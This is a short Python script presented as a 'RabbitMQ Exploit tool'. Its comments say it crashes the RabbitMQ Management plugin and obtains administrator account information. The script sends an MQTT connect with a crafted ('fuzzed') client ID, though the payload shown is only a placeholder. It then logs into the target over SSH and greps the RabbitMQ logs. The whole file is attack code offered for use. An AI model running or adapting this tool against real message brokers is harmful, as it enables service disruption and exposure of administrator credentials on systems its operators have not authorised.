# -*- coding: utf-8 -*- 

# Written by paran_son@outlook.com
# Updated 190502
#
# This is RabbitMQ Exploit tool!
# Tested version RabbitMQ 3.6.10, Erlang 20.2.2
#
# This exploit tool crashes the RabbitMQ Management plugin
# and gets the [Administrator] account information.

import sys
import argparse
import paho.mqtt.client
import paramiko

fuzzed_id="test"
fuzzed_id=fuzzed_id.decode(encoding='base64_codec',errors='strict')

def get_log(ssh_ip,ssh_port,sid,spw):
    print('+ | get_log func Running!')
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ssh_ip,ssh_port,sid,spw)
    stdin, stdout, stderr = ssh.exec_command('grep "Ranch listener rabbit_web_dispatch_sup_15672" /var/log/rabbitmq/rabbit@`hostname`.log')
    stdin.close()
    for line in stdout.read().splitlines():
        print(line)

    ssh.close()

def on_message(client, userdata, message):
	print('------------------------------')
	print('topic: %s' % message.topic)
	print('payload: %s' % message.payload)
	print('qos: %d' % message.qos)

def main():    
    parser = argparse.ArgumentParser(description="This is RabbitMQ exploit tool with MQTT Protocol.")
    parser.add_argument("ip",help="Target IP")
    parser.add_argument("port",help="Target MQTT PORT")
    parser.add_argument("-t", "--topic",action='store', help="MQTT topic")
    parser.add_argument("-i", "--id", action='store', help="auth ID")
    parser.add_argument("-p", "--pw", action='store', help="auth PW")
    parser.add_argument("-d", "--sid", action='store', help="SERVER user ID")
    parser.add_argument("-w", "--spw", action='store', help="SERVER user PW")
    
    args = parser.parse_args()

    if(args.topic and args.id and args.pw):
        try:
            print('+ | Send fuzzed MQTT message.')
            client = paho.mqtt.client.Client(client_id=fuzzed_id, clean_session=False)
            client.username_pw_set(args.id, args.pw)
            print('+ | connected (%s)' % client._client_id)
	    client.subscribe(args.topic, qos=0)
            client.on_message = on_message
            client.connect(args.ip, args.port)
            #client.loop_forever()
            client.loop_start()
            raw_input('+ | Press Enter to get the log.')
            if(args.sid and args.spw):
                print('+ | get log function started!')
                get_log(args.ip,22,args.sid,args.spw)
            else:
                print('Parameter error')
            #client.loop_stop()
        except KeyboardInterrupt:
            print('END')
            client.loop_stop()
            sys.exit(0)
        finally:
            print('EXIT')

if __name__ == '__main__':
    main()
